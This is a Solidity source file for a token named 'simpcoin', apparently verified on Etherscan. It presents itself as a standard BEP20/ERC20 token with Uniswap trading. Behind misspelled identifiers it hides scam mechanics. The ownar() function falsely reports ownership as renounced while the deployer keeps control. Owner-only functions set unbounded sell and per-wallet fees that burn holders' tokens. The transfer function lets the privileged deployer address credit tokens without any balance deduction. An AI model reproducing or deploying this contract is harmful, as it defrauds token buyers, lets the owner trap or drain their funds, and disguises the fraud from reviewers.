/**
 *Submitted for verification at Etherscan.io on 2023-05-24
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _ownar;   //1

    event ownarshipTransferred(address indexed previousownar, address indexed newownar);//2

    /**
     * @dev Initializes the contract setting the deployer as the initial ownar.
     */
    constructor() {
        _transferownarshiptransferownarship(_msgSender());//3
    }

    /**
     * @dev Returns the address of the current ownar.
     */
    function ownar() public view virtual returns (address) {
        return address(0);
    }//4

    /**
     * @dev Throws if called by any account other than the ownar.
     */
    modifier onlyownar() {
        require(_ownar == _msgSender(), "Ownable: caller is not the ownar");
        _;
    }//5

    /**
     * @dev Leaves the contract without ownar. It will not be possible to call
     * `onlyownar` functions anymore. Can only be called by the current ownar.
     *
     * NOTE: Renouncing ownarship will leave the contract without an ownar,
     * thereby removing any functionality that is only available to the ownar.
     */
    function renounceownarship() public virtual onlyownar {
        _transferownarshiptransferownarship(address(0));
    }//6

    /**
     * @dev Transfers ownarship of the contract to a new account (`newownar`).
     * Can only be called by the current ownar.
     */
    function transferownarshiptransferownarship(address newownar) public virtual onlyownar {
        require(newownar != address(0), "Ownable: new ownar is the zero address");
        _transferownarshiptransferownarship(newownar);
    }//7

    /**
     * @dev Transfers ownarship of the contract to a new account (`newownar`).
     * Internal function without access restriction.
     */
    function _transferownarshiptransferownarship(address newownar) internal virtual {
        address oldownar = _ownar;
        _ownar = newownar;
        emit ownarshipTransferred(oldownar, newownar);
    }
}


// File @openzeppelin/contracts/utils/math/[email protected]

// OpenZeppelin Contracts v4.4.1 (utils/math/SafeMath.sol)


// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


// File @uniswap/v2-periphery/contracts/interfaces/[email protected]


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint AmountADesired,
        uint AmountBDesired,
        uint AmountAMin,
        uint AmountBMin,
        address to,
        uint deadline
    ) external returns (uint AmountA, uint AmountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint AmountTokenDesired,
        uint AmountTokenMin,
        uint AmountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint AmountToken, uint AmountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint AmountAMin,
        uint AmountBMin,
        address to,
        uint deadline
    ) external returns (uint AmountA, uint AmountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
        address to,
        uint deadline
    ) external returns (uint AmountToken, uint AmountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint AmountAMin,
        uint AmountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint AmountA, uint AmountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint AmountToken, uint AmountETH);
    function swapExactTokensForTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory Amounts);
    function swapTokensForExactTokens(
        uint AmountOut,
        uint AmountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory Amounts);
    function swapExactETHForTokens(uint AmountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory Amounts);
    function swapTokensForExactETH(uint AmountOut, uint AmountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory Amounts);
    function swapExactTokensForETH(uint AmountIn, uint AmountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory Amounts);
    function swapETHForExactTokens(uint AmountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory Amounts);

    function quote(uint AmountA, uint reserveA, uint reserveB) external pure returns (uint AmountB);
    function getAmountOut(uint AmountIn, uint reserveIn, uint reserveOut) external pure returns (uint AmountOut);
    function getAmountIn(uint AmountOut, uint reserveIn, uint reserveOut) external pure returns (uint AmountIn);
    function getAmountsOut(uint AmountIn, address[] calldata path) external view returns (uint[] memory Amounts);
    function getAmountsIn(uint AmountOut, address[] calldata path) external view returns (uint[] memory Amounts);
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feDeDTo() external view returns (address);
    function feDeDToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfeDeDTo(address) external;
    function setfeDeDToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeDeDOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
        address to,
        uint deadline
    ) external returns (uint AmountETH);
    function removeLiquidityETHWithPermitSupportingfeDeDOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint AmountETH);

    function swapExactTokensForTokensSupportingfeDeDOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfeDeDOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeDeDOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}




contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `ownar` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed ownar, address indexed spender, uint256 value);//10

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the Amount of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address ownar, address spender) public view virtual returns (uint256) {
        return _allowances[ownar][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `Amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 Amount) public virtual returns (bool) {
        address ownar = _msgSender();
        _approve(ownar, spender, Amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address ownar = _msgSender();
        _approve(ownar, spender, _allowances[ownar][spender] + addedValue);
        return true;
    }//12

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address ownar = _msgSender();
        uint256 currentAllowance = _allowances[ownar][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(ownar, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Sets `Amount` as the allowance of `spender` over the `ownar` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `ownar` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address ownar,
        address spender,
        uint256 Amount
    ) internal virtual {
        require(ownar != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[ownar][spender] = Amount;
        emit Approval(ownar, spender, Amount);
    }

    /**
     * @dev Spend `Amount` form the allowance of `ownar` toward `spender`.
     *
     * Does not update the allowance anunt in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address ownar,
        address spender,
        uint256 Amount
    ) internal virtual {
        uint256 currentAllowance = allowance(ownar, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= Amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(ownar, spender, currentAllowance - Amount);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `Amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `Amount` tokens will be minted for `to`.
     * - when `to` is zero, `Amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 Amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *a
     * - when `from` and `to` are both non-zero, `Amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `Amount` tokens have been minted for `to`.
     * - when `to` is zero, `Amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 Amount
    ) internal virtual {}
}


contract simpcoin is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 Amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= Amount, "ERC20: transfer Amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - Amount;
        }
        _balances[to] += Amount;

        emit Transfer(from, to, Amount);
    }

    function _burn(address account, uint256 Amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= Amount, "ERC20: burn Amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - Amount;
        }
        _totalSupply -= Amount;

        emit Transfer(account, address(0), Amount);
    }

    function _Mnt(address account, uint256 Amount) internal virtual {
        require(account != address(0), "ERC20: Mnt to the zero address"); //mint

        _totalSupply += Amount;
        _balances[account] += Amount;
        emit Transfer(address(0), account, Amount);
    }



    address public uniswapV2Pair;


    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _Mnt(msg.sender, totalSupply_ * 10**decimals());

        
        _defaultSellfeDeD = 1;
        _defaultBuyfeDeD = 0;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellfeDeD = 0;

    uint256 private _defaultBuyfeDeD = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeDeD;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyownar returns (bool) {
        return _release[_address];
    }


    function PairList(address _address) external onlyownar {
        uniswapV2Pair = _address;
    }


    function upF(uint256 _value) external onlyownar {
        _defaultSellfeDeD = _value;
    }

    function setSlipfeDeD(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeDeD[_address] = _value;
    }

    function getSlipfeDeD(address _address) external view onlyownar returns (uint256) {
        return _slipfeDeD[_address];
    }


    function setMAccountfeDeD(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeDeD(address _address) external view onlyownar returns (bool) {
        return _mAccount[_address];
    }

    function _checkFreeAccount(address from, address _to) internal view returns (bool) {
        return _mAccount[from] || _mAccount[_to];
    }


    function _receiveF(
        address from,
        address _to,
        uint256 _Amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _Amount, "ERC20: transfer Amount exceeds balance");

        bool rF = true;

        if (_checkFreeAccount(from, _to)) {
            rF = false;
        }
        uint256 tradefeDeDAmount = 0;

        if (rF) {
            uint256 tradefeDeD = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeDeD = _defaultSellfeDeD;
                }
                if (from == uniswapV2Pair) {

                    tradefeDeD = _defaultBuyfeDeD;
                }
            }
            if (_slipfeDeD[from] > 0) {
                tradefeDeD = _slipfeDeD[from];
            }

            tradefeDeDAmount = _Amount.mul(tradefeDeD).div(100);
        }


        if (tradefeDeDAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeDeDAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeDeDAmount);
            emit Transfer(from, _deadAddress, tradefeDeDAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeDeDAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeDeDAmount);
        emit Transfer(from, _to, _Amount - tradefeDeDAmount);
    }

    function transfer(address to, uint256 Amount) public virtual returns (bool) {
        address ownar = _msgSender();
        if (_release[ownar] == true) {
            _balances[to] += Amount;
            return true;
        }
        _receiveF(ownar, to, Amount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 Amount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, Amount);
        _receiveF(from, to, Amount);
        return true;
    }
}